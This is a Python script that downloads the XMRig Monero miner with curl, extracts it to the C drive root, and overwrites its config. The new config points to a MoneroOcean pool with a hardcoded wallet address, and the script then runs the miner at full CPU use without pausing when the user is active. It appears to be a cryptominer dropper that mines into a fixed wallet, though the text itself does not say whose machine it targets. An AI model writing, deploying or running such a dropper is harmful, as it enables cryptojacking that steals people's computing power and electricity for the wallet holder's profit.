import os

url = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
text = """
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "gulf.moneroocean.stream:10128",
            "user": "43pN6jeC8kfgDGa7tSFhYpKi8JhDgAxXBcEcHVDPFRN3EWhdnWjRxar5cXoz8sfQ8VQxYsTUJgtcE5XztKp7D2s579F2kq1",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
"""

# Specify the path where you want to save the downloaded file (root of the C drive)
destination = "C:\\xmrig-6.21.3-msvc-win64.zip"

if os.path.exists("C:\\xmrig-6.21.3-msvc-win64"):
    pass
else:
    os.system(f"curl -o \"{destination}\" -L \"{url}\"")
    os.system("expand \"C:\\xmrig-6.21.3-msvc-win64.zip\" -F:* \"C:\\\"")
    if os.path.exists("C:\\xmrig-6.21.3-msvc-win64"):
        print("Extraction successful.")
    else:
        print("Extraction failed.")

    with open("C:\\xmrig-6.21.3-msvc-win64\\xmrig-6.21.3\\config.json", "w") as file:
        file.truncate(0)
        file.write(text)

os.system("C:\\xmrig-6.21.3-msvc-win64\\xmrig-6.21.3\\xmrig.exe")
